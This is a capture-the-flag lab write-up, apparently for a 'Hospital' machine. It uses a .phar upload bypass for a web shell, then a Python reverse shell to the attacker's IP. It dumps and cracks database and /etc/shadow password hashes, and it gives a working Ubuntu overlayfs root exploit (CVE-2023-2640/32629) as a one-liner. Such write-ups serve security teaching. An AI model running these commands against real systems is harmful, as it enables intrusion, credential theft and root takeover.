We found a webbapp where we can create an account and upload a file image. After upload a test PNG image we found this file at http://10.10.11.241:8080/uploads/example-image.png so we can try to upload a php shell and get RCE. We can remove the html filter for image files and upload whatever we want and we find it vulnerable to .phar extension

![[Pasted image 20231120122401.png]]

We use the **[p0wny-shell](https://github.com/flozz/p0wny-shell)** and we get RCE. Not we got a fully interactive shell with a python reverse shell

```bash
www-data@webserver:…/html/uploads# python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

--------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.241] 6540
www-data@webserver:/var/www/html/uploads$ whoami
www-data
```

Once in, we found a config.php file in /var/www/html

```bash
www-data@webserver:/var/www/html/uploads$ cat /var/www/html/config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

So we connect to mysql and search for useful info

```bash
www-data@webserver:/$ mysql -h localhost -u root -p'my$qls3rv1c3!' hospital                 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1521
Server version: 10.11.2-MariaDB-1 Ubuntu 23.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [hospital]>show databases;
+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.002 sec)

MariaDB [hospital]> use hospital;
Database changed
MariaDB [hospital]> show tables;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
1 row in set (0.000 sec)

MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | asd      | $2y$10$V6mKdRYvTUok4ayYLv3Tv.89eNMsTUaaIr9jco/d6cMgQTgCZxQYG | 2023-11-20 03:04:56 |
|  4 | shani    | $2y$10$pCgIc.qqdbsgWoZeHQB.fOzfIhY/ZGgZE8AxaJuXLs10kpBoTJrDO | 2023-11-20 03:05:16 |
|  5 | foo      | $2y$10$gh2ynSQOh3CjQ4Cr2labGup1WDS5sFzK7cq6ZHppUNSSxBlHEdTVe | 2023-11-20 15:43:15 |
|  6 | test123  | $2y$10$f9EtPX8aqU7RldLVWuWgU.W/bM89c38.z9uwflnhZB.A7cpoDKKLO | 2023-11-20 16:16:44 |
|  7 | myuser  | $2y$10$BcnUH00Ohg/PDeN0xxiR0.RcG0.4RmBMvUIE3hA71dOd0j0.zyDsq | 2023-11-20 18:23:09 |
+----+----------+--------------------------------------------------------------+---------------------+
7 rows in set (0.000 sec)
```

With john we get admin:123456 credentials

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Hospital-10.10.11.241]
└─$ john hashes -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456 (admin)           (?)     
1g 0:00:00:11 0.01% (ETA: 2023-11-22 23:07) 0.09000g/s 84.24p/s 85.86c/s 85.86C/s blonde..brian
1g 0:00:04:18 0.11% (ETA: 2023-11-23 06:04) 0.003867g/s 74.21p/s 74.28c/s 74.28C/s prieto..mike06
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

We try this credentials at the webapp but nothing interesting appears. After some searching we found the OS vulnerable (**[CVE-2023-2640 & CVE-2023-32629](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/)**). We can escalate executing the following commands

```bash
www-data@webserver:/$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;  
  
> setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'

root@webserver:/tmp# whoami 
root
```

We are root but we still not founding the flags so lets enumerate again

```bash
[>] cat /etc/shadow 
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19[...SNIP...]
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:1961
lxd:!:19612::::::
mysql:!:19620::::::
```

We found root and drwilliams hashes and with john we get drwilliams:qwe123!@#